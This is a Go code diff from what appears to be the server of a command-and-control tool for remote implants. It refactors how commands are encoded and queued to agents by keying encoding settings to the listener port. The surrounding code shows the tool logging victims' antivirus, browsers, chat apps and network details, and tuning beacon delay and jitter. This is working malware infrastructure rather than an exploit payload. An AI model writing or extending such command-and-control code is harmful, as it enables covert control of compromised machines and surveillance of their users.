@@ -67,10 +67,8 @@ var (
 
 	/*不可清理*/
 	base_map = make(map[string]string) //存
+	code_map = make(map[string]map[byte]int)
 	/*不可清理*/ serverRouteMu sync.RWMutex // 同时保护 base_map 和 code_map
-	/*不可清理*/ uid_base = make(map[string]string) //写
-	/*不可清理*/ uidMutex sync.RWMutex
-	/*不可清理*/ code_map = make(map[string]map[byte]int)
 
 	sessionSlice []string
 	/*不可清理*/ error_str string
@@ -142,11 +140,6 @@ func (m *MainHandler) Index(conn, Get_Msg, switch_key, download, result, net, in
 			if uidBytes != "" {
 				uid_decode, _ := customBase64Decode(uidBytes, code_rounds)
 				uid = string(uid_decode)
-				uidMutex.Lock()
-				if _, exists := uid_base[uid]; !exists {
-					uid_base[uid] = base_rounds
-				}
-				uidMutex.Unlock()
 			}
 			switch op {
 			case conn: //监听
@@ -753,7 +746,8 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 					uid, _ := body["uid"].(string)
 					msg, _ := body["msg"].(string)
 					taskid, _ := body["taskid"].(string)
-					errStr := Getcmd(uid, msg, taskid)
+					port, _ := body["port"].(string)
+					errStr := Getcmd(uid, msg, taskid, port)
 					if errStr != "" {
 						clientWs.WriteJSON(map[string]interface{}{
 							"code":    500,
@@ -849,7 +843,7 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 						break
 					}
 
-					del := deleteConnAtIndex(index, true)
+					del := deleteConnAtIndex(index)
 					if del {
 						clientWs.WriteJSON(map[string]interface{}{
 							"code":    200,
@@ -913,10 +907,6 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 					keyMu.Lock()
 					delete(key_map, uid)
 					keyMu.Unlock()
-
-					uidMutex.Lock()
-					delete(uid_base, uid)
-					uidMutex.Unlock()
 
 					queuesMu.Lock()
 					delete(msgQueues, uid)
@@ -1852,6 +1842,7 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 					delay, _ := body["delay"].(string)
 					jitter, _ := body["jitter"].(string)
 					taskid, _ := body["taskid"].(string)
+					port, _ := body["port"].(string)
 					result := Change_pro(
 						uid,
 						username_,
@@ -1859,6 +1850,7 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 						delay,
 						jitter,
 						taskid,
+						port,
 					)
 					switch result {
 					case "confirm":
@@ -1893,6 +1885,7 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 					delay, _ := body["delay"].(string)
 					jitter, _ := body["jitter"].(string)
 					taskid, _ := body["taskid"].(string)
+					port, _ := body["port"].(string)
 					result := Change(
 						uid,
 						username_,
@@ -1900,6 +1893,7 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 						delay,
 						jitter,
 						taskid,
+						port,
 					)
 					switch result {
 					case "confirm":
@@ -3047,7 +3041,7 @@ func GetInfo(uid, encry_str, clientIP string, key []byte, code_map map[byte]int)
 	log_str1 := fmt.Sprintf(log_word["agent_online"],
 		username, uid, shellname, osname, version, executable, t, jitter, clientIP, innet_ip, port, protocol, server_remark, currentDir, hashString)
 	logger.WriteLog(log_str1)
-	go DeleteEntry(uid, false)
+	go DeleteEntry(uid)
 }
 func Windows_GetInfo(uid, encry_str, clientIP string, key []byte, code_map map[byte]int) {
 	data := Get_decry_s(&encry_str, &key, code_map)
@@ -3099,7 +3093,7 @@ func Windows_GetInfo(uid, encry_str, clientIP string, key []byte, code_map map[b
 		username, uid, shellname, osname, version, executable, t, jitter, clientIP, innet_ip, port, protocol, server_remark, currentDir, hashString, macs, cpuInfo, memoryStr, systemType, arch, antivirus, browsers, chatApps)
 	logger.WriteLog(log_str)
 	// 删除连接条目
-	go DeleteEntry(uid, false)
+	go DeleteEntry(uid)
 }
 func updateServerClients(port string, serverChan chan<- string) {
 	serverRemark := "unknown"
@@ -3115,7 +3109,7 @@ func updateServerClients(port string, serverChan chan<- string) {
 	serverDataMu.RUnlock()
 	serverChan <- serverRemark
 }
-func Change_pro(uid, username, remarks, delay, jitter, Taskid string) string {
+func Change_pro(uid, username, remarks, delay, jitter, Taskid,port string) string {
 	windows_clientMu.Lock()
 	defer windows_clientMu.Unlock()
 	for i := range windows_client_data.Clients {
@@ -3158,7 +3152,7 @@ func Change_pro(uid, username, remarks, delay, jitter, Taskid string) string {
 				}
 				client.Delay = int_delay
 				delayModified = true
-				go Getcmd(uid, "GET_DELAY*//*"+delay, Taskid)
+				go Getcmd(uid, "GET_DELAY*//*"+delay, Taskid,port)
 			}
 			if int_jitter != client.Jitter {
 				if int_jitter <= 0 {
@@ -3166,7 +3160,7 @@ func Change_pro(uid, username, remarks, delay, jitter, Taskid string) string {
 				}
 				client.Jitter = int_jitter
 				jitterModified = true
-				go Getcmd(uid, "GET_JITTER*//*"+jitter, Taskid)
+				go Getcmd(uid, "GET_JITTER*//*"+jitter, Taskid,port)
 			}
 			if !usernameModified && !remarksModified && !delayModified && !jitterModified {
 				return "No changes needed"
@@ -3179,7 +3173,7 @@ func Change_pro(uid, username, remarks, delay, jitter, Taskid string) string {
 	}
 	return "nil"
 }
-func Change(uid, username, remarks, delay, jitter, Taskid string) string {
+func Change(uid, username, remarks, delay, jitter, Taskid,port string) string {
 	clientDataMu.Lock()
 	defer clientDataMu.Unlock()
 	for i := range client_data.Clients {
@@ -3223,7 +3217,7 @@ func Change(uid, username, remarks, delay, jitter, Taskid string) string {
 				client.Delay = int_delay
 				delayModified = true
 				cmd := "GET_DELAY*//*" + delay
-				go Getcmd(uid, cmd, Taskid)
+				go Getcmd(uid, cmd, Taskid,port)
 			}
 			if int_jitter != client.Jitter {
 				if int_jitter <= 0 {
@@ -3232,7 +3226,7 @@ func Change(uid, username, remarks, delay, jitter, Taskid string) string {
 				client.Jitter = int_jitter
 				jitterModified = true
 				cmd := "GET_JITTER*//*" + jitter
-				go Getcmd(uid, cmd, Taskid)
+				go Getcmd(uid, cmd, Taskid,port)
 			}
 			if !usernameModified && !remarksModified && !delayModified && !jitterModified {
 				return "No changes needed"
@@ -3433,15 +3427,9 @@ func deleteMLKEMKey(uid string) {
 	delete(mlkemKeys, uid)
 }
 
-func cleanupDeletedUID(uid string, deletedIndex int, delbase bool) {
+func cleanupDeletedUID(uid string, deletedIndex int) {
 
 	deleteMLKEMKey(uid)
-
-	if delbase {
-		uidMutex.Lock()
-		delete(uid_base, uid)
-		uidMutex.Unlock()
-	}
 
 	go PushWS(
 		"",
@@ -3453,7 +3441,7 @@ func cleanupDeletedUID(uid string, deletedIndex int, delbase bool) {
 	)
 }
 
-func deleteConnAtIndex(index int, delbase bool) bool {
+func deleteConnAtIndex(index int) bool {
 	if index < 0 {
 		return false
 	}
@@ -3473,11 +3461,11 @@ func deleteConnAtIndex(index int, delbase bool) bool {
 	)
 	dataConnMu.Unlock()
 
-	cleanupDeletedUID(uid, index, delbase)
+	cleanupDeletedUID(uid, index)
 	return true
 }
 
-func DeleteEntry(delshell string, delbase bool) {
+func DeleteEntry(delshell string) {
 	if delshell == "" {
 		return
 	}
@@ -3504,7 +3492,7 @@ func DeleteEntry(delshell string, delbase bool) {
 	)
 	dataConnMu.Unlock()
 
-	cleanupDeletedUID(uid, index, delbase)
+	cleanupDeletedUID(uid, index)
 }
 
 // 写入目录列表
@@ -3966,16 +3954,15 @@ func GetMsg(uid, uidBytes string) string {
 }
 
 // 写入指令（推送到对应 uid 的消息队列）
-func Getcmd(uid, cmd, Taskid string) string {
-	var base_rounds string
-	if uid != "" {
-		uidMutex.RLock()
-		val, exists := uid_base[uid]
-		uidMutex.RUnlock()
-		if !exists {
-			return "missing parameter"
-		}
-		base_rounds = val
+func Getcmd(uid, cmd, Taskid,port string) string {
+	if uid == "" || port == "" {
+		return "missing parameter"
+	}
+	serverRouteMu.RLock()
+	baseRounds, exists := base_map[port]
+	serverRouteMu.RUnlock()
+	if !exists {
+		return "port not registered"
 	}
 	keyMu.RLock()
 	key, exists := key_map[uid]
@@ -4139,7 +4126,7 @@ func Getcmd(uid, cmd, Taskid string) string {
 	}
 
 	// 加密
-	encryptedCmd := Get_encry_s(&finalCmd, &key, &base_rounds)
+	encryptedCmd := Get_encry_s(&finalCmd, &key, &baseRounds)
 
 	// 写入消息队列（使用新队列结构）
 	newMsg := Msg_get{
